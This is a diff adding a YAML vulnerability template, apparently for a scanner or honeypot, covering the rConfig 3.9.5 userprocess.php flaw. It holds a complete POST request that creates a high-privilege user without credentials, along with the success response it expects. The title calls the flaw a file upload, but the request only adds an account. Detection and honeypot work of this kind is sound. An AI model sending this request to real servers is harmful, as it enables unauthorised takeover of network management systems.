@@ -1,0 +1,65 @@
+id: rconfig-file-upload
+info:
+  name: rConfig 3.9.5 - Arbitrary File Upload
+  author: dwisiswant0
+  description: 'rConfig 3.9.5 is susceptible to an arbitrary file upload via the userprocess.php
+    endpoint. An attacker can execute malware, obtain sensitive information, modify
+    data, and/or gain full control over a compromised system without entering necessary
+    credentials.
+
+    '
+  severity: high
+  reference:
+  - https://www.rconfig.com/downloads/rconfig-3.9.5.zip
+  - https://www.exploit-db.com/exploits/48878
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.8
+    cwe-id: CWE-434
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"rConfig"
+  tags: rconfig,rce,edb,file-upload,instrusive,intrusive
+traps:
+- request:
+    method: POST
+    path: /lib/crud/userprocess.php
+    headers:
+      Accept: '*/*'
+      Content-Type: multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb
+      Cookie: PHPSESSID={{randstr}}
+    body: |
+      --01b28e152ee044338224bf647275f8eb
+      Content-Disposition: form-data; name="username"
+
+      {{randstr}}
+      --01b28e152ee044338224bf647275f8eb
+      Content-Disposition: form-data; name="passconf"
+
+      Testing1@
+      --01b28e152ee044338224bf647275f8eb
+      Content-Disposition: form-data; name="password"
+
+      Testing1@
+      --01b28e152ee044338224bf647275f8eb
+      Content-Disposition: form-data; name="email"
+
+      test@{{randstr}}.tld
+      --01b28e152ee044338224bf647275f8eb
+      Content-Disposition: form-data; name="editid"
+
+
+      --01b28e152ee044338224bf647275f8eb
+      Content-Disposition: form-data; name="add"
+
+      add
+      --01b28e152ee044338224bf647275f8eb
+      Content-Disposition: form-data; name="ulevelid"
+
+      9
+      --01b28e152ee044338224bf647275f8eb--
+  response:
+    status_code: 302
+    headers: {}
+    body: User {{randstr}} successfully added to Database
